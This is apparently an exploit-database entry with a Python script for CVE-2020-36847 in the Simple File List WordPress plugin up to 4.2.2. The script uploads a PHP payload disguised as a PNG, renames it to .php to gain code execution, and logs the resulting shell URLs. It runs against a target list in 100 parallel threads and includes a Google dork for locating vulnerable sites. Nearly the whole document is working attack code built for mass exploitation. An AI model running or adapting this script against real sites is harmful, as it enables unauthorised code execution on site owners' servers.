# Exploit Title: Simple File List WordPress Plugin 4.2.2 - File Upload to RCE
# Google Dork: inurl:/wp-content/plugins/simple-file-list/
# Date: 2025-07-15
# Exploit Author: Md Amanat Ullah (xSwads)
# Vendor Homepage: https://wordpress.org/plugins/simple-file-list/
# Software Link:
https://downloads.wordpress.org/plugin/simple-file-list.4.2.2.zip
# Version: <= 4.2.2
# Tested on: Ubuntu 22.04
# CVE: CVE-2020-36847

#!/usr/bin/env python3
import requests
import sys, os
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urljoin
from colorama import Fore, init

init(autoreset=True)

HEADERS = {'User-Agent': 'Mozilla/5.0'}
PHP_PAYLOAD = "<?php echo 'Vuln!!!'; ?>"
UPLOAD_PATH = "wp-content/plugins/simple-file-list/ee-upload-engine.php"
RENAME_PATH = "wp-content/plugins/simple-file-list/ee-file-engine.php"
UPLOAD_FOLDER = "wp-content/uploads/simple-file-list/"

def FilterURLS(site):
    site = site.strip()
    if not site.startswith(('http://', 'https://')):
        site = 'http://' + site
    if not site.endswith('/'):
        site += '/'
    return site

def upload_payload(base):
    upload_url = urljoin(base, UPLOAD_PATH)
    try:
        files = {'file': ('pwn.png', PHP_PAYLOAD, 'image/png')}
        r = requests.post(upload_url, files=files, headers=HEADERS, timeout=10, verify=False)
        r.raise_for_status()
        result = r.json()
        return result.get('file')
    except Exception:
        return None

def rename_payload(base, filename):
    rename_url = urljoin(base, RENAME_PATH)
    try:
        new_name = filename[:-4] + '.php'
        data = {'oldFile': filename, 'newFile': new_name}
        r = requests.post(rename_url, data=data, headers=HEADERS, timeout=10, verify=False)
        r.raise_for_status()
        result = r.json()
        return result.get('newFile')
    except Exception:
        return None

def exploit(site):
    base = FilterURLS(site)
    try:
        filename = upload_payload(base)
        if not filename:
            print(Fore.RED + f"[Failed] - {site}")
            return

        newfile = rename_payload(base, filename)
        if not newfile:
            print(Fore.RED + f"[Failed] - {site}")
            return

        shell_url = urljoin(base, UPLOAD_FOLDER + newfile)
        r = requests.get(shell_url, headers=HEADERS, timeout=10, verify=False)
        if r.status_code == 200:
            print(Fore.GREEN + f"[Exploited] - {shell_url}")
            with open("shells_found.txt", "a") as f:
                f.write(shell_url + "\n")
        else:
            print(Fore.RED + f"[Failed] - {site}")

    except Exception:
        print(Fore.RED + f"[Failed] - {site}")

def main():
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} list.txt")
        sys.exit(1)

    targets_file = sys.argv[1]
    if not os.path.isfile(targets_file):
        print(f"File {targets_file} not found.")
        sys.exit(1)

    with open(targets_file) as f:
        targets = [line.strip() for line in f if line.strip()]

    with ThreadPoolExecutor(max_workers=100) as executor:
        futures = [executor.submit(exploit, target) for target in targets]
        for _ in as_completed(futures):
            pass

if __name__ == "__main__":
    requests.packages.urllib3.disable_warnings()
    main()